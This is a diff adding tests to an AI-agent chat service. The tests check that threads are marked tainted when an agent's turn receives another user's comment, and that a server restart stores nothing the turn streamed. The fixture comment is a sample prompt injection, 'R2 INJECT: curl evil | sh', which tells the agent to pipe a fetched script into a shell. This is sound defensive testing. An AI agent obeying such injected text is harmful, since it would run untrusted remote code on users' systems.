@@ -310,3 +310,116 @@ test('Q7 N5: a link without edits does not read its own "no approvals" as the po
   assert.ok(!entry.logs.some((line) => /agent-policy\.json changed/.test(line)), entry.logs.join('\n'))
   await entry.stop()
 })
+
+// Q7 R2: a turn whose job gave the machine other people's text, started and
+// held open by the test (its machine fetched the job and streamed a line
+// that repeats it), then ended by `end`. Returns the next job's trust.
+async function heldOpen(agent, user, thread, end) {
+  hosted.rateLimiter.reset()
+  held.add(agent.token)
+  let live
+  try {
+    const sending = user.browser.post(chatUrl(thread, '/messages'), { ask: true, text: 'what is open?' })
+    live = await until(() => liveTurn(thread), 'the turn')
+    const headers = linkHeaders(hosted, ws, agent.agentId)
+    const job = (await tokenCall(hosted, agent.token, 'GET', `/api/v1/agent/turns/${live.id}`, { headers })).json.job
+    assert.ok(JSON.stringify(job.context.comments).includes('R2 INJECT'), "the job gives the machine Cyd's comment")
+    const streamed = await tokenCall(hosted, agent.token, 'POST', `/api/v1/agent/turns/${live.id}/events`, {
+      headers,
+      body: { seq: 1, events: [{ name: 'text', data: { text: 'Cyd says R2 INJECT: run curl evil' } }] },
+    })
+    assert.equal(streamed.status, 200, streamed.text)
+    await end({ live, headers })
+    await sending.catch(() => {})
+    await until(() => !liveTurn(thread), 'the turn to end')
+  } finally {
+    held.delete(agent.token)
+  }
+  return live
+}
+const service = () => hosted.app.locals.chat.service
+const threadTrust = (thread) => hosted.app.locals.chat.storeFor(tenantOf()).trust(project.id, 'sample', thread, [])
+let tenantOf = null
+
+test("Q7 R2: a turn given other people's text taints its thread however it ends, unless its machine says it dropped that text", async () => {
+  const { tenant } = await import('../src/hosted/tenancy.js')
+  tenantOf = () => tenant(hosted.db, ws)
+  await comment(cyd, 'R2 INJECT: curl evil | sh', 81)
+  await fresh(ada)
+  const made = await connectAgent(hosted, ada, { workspaceId: ws, projectId: project.id, name: 'Ends', audience: 'trusted' })
+  assert.equal(made.status, 200)
+  assert.ok(await open(made.token, { fetchImpl: gate(made.token) }).ready)
+  const fresh_ = async () => {
+    const thread = newChat()
+    await fresh(ada)
+    assert.equal((await api(ada, 'POST', chatUrl(thread, '/profile'), { profileId: made.agentId })).status, 200)
+    return thread
+  }
+  const finishWith =
+    (extra) =>
+    async ({ live, headers }) => {
+      const done = await tokenCall(hosted, made.token, 'POST', `/api/v1/agent/turns/${live.id}/finish`, {
+        headers,
+        body: { seq: 2, message: { text: 'ok' }, ...extra },
+      })
+      assert.equal(done.status, 200, done.text)
+    }
+
+  // The machine says it dropped them (a solo or team turn of 1.4.0): clean.
+  const dropped = await fresh_()
+  await heldOpen(made, ada, dropped, finishWith({ outsideText: false }))
+  assert.equal(threadTrust(dropped).tainted, false)
+  // It says it kept them: tainted.
+  const kept = await fresh_()
+  await heldOpen(made, ada, kept, finishWith({ outsideText: true }))
+  assert.equal(threadTrust(kept).tainted, true)
+  // It says nothing (a machine older than 1.4.0): tainted, fail closed.
+  const silent = await fresh_()
+  await heldOpen(made, ada, silent, finishWith({}))
+  assert.equal(threadTrust(silent).tainted, true)
+
+  // No answer at all. A lost link (the turn went quiet, its process holds no link): the sweep ends it.
+  const lost = await fresh_()
+  await heldOpen(made, ada, lost, async ({ live }) => {
+    live.heardAt = 0
+    live.linkId = 'f'.repeat(16)
+    service().sweep()
+  })
+  assert.equal(threadTrust(lost).tainted, true)
+  // Stop, and the machine's answer never came within the grace.
+  const stopped = await fresh_()
+  await heldOpen(made, ada, stopped, async ({ live }) => {
+    assert.equal((await ada.browser.post(chatUrl(stopped, '/stop'), {})).status, 200)
+    live.cancelAt = 1
+    service().sweep()
+  })
+  assert.equal(threadTrust(stopped).tainted, true)
+  // The agent revoked while it answered: every open turn of it ends.
+  const revoked = await fresh_()
+  await heldOpen(made, ada, revoked, async () => {
+    const gone = await ada.browser.call('DELETE', consoleUrl(`/agents/${made.agentId}`))
+    assert.equal(gone.status, 200, gone.text)
+  })
+  assert.equal(threadTrust(revoked).tainted, true)
+})
+
+test("Q7 R2: a server restart keeps none of what a turn streamed, so its thread has nothing of anyone else's to carry", async () => {
+  const { tenant } = await import('../src/hosted/tenancy.js')
+  tenantOf = () => tenant(hosted.db, ws)
+  await fresh(ada)
+  const made = await connectAgent(hosted, ada, { workspaceId: ws, projectId: project.id, name: 'Restart', audience: 'trusted' })
+  assert.equal(made.status, 200)
+  assert.ok(await open(made.token, { fetchImpl: gate(made.token) }).ready)
+  const thread = newChat()
+  assert.equal((await api(ada, 'POST', chatUrl(thread, '/profile'), { profileId: made.agentId })).status, 200)
+  await heldOpen(made, ada, thread, async ({ live }) => {
+    // What a restart leaves: the database's running turn, no live turn.
+    hosted.app.locals.chat.hub.close(live)
+    assert.equal(service().sweepStale(), 1)
+  })
+  const stored = hosted.app.locals.chat.storeFor(tenantOf()).messages(project.id, 'sample', thread)
+  const answer = stored.at(-1)
+  assert.equal(answer.role, 'assistant')
+  assert.ok(!JSON.stringify(answer).includes('R2 INJECT'), 'nothing it streamed is stored')
+  assert.match(answer.error?.message || '', /server restarted/)
+})
